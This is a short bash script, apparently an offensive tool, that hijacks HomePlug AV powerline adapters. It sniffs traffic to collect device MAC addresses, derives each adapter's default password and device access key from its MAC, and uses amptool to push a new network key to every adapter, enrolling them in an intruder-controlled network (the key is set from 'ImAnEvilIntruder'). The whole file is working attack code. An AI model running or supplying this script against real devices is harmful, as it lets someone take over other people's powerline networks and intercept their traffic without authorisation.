#!/bin/bash
# Start by sniffing out HPAV clients and then co-opt them into our network

INTERFACE='eth0'

python triggerSniff.py
tcpdump -s0 -w cap.pcap & sleep 10s && pkill tcpdump

NEWKEY=$(hpavkey -M 'ImAnEvilIntruder')


# Set the NMK of our local device
amptool -M -K $NEWKEY -i $INTERFACE

# Wait while the device resets
echo "Waiting 5 seconds"
sleep 5

    # Cycle through the pcap
    python listMacs.py cap.pcap | sort | uniq | while read -r address
    do
    # We need the MAC in two formats
    macaddress=$(echo ${address:2})
    macsolid=$(echo $macaddress | sed 's/ //g')
    maccolon=$(echo $macaddress | sed 's/ /:/g')
    # Generate the password and then the DAK
    pass=$(mac2pw -q $macsolid)
    dak=$( hpavkey -D $pass )

    # Configure the device
    echo "Attempting to enrol $maccolon"
    amptool -D $dak -J $maccolon -i $INTERFACE -M -K $NEWKEY
    echo

    # Sleep for a second so we're sure we're not hammering our device
    sleep 1

done

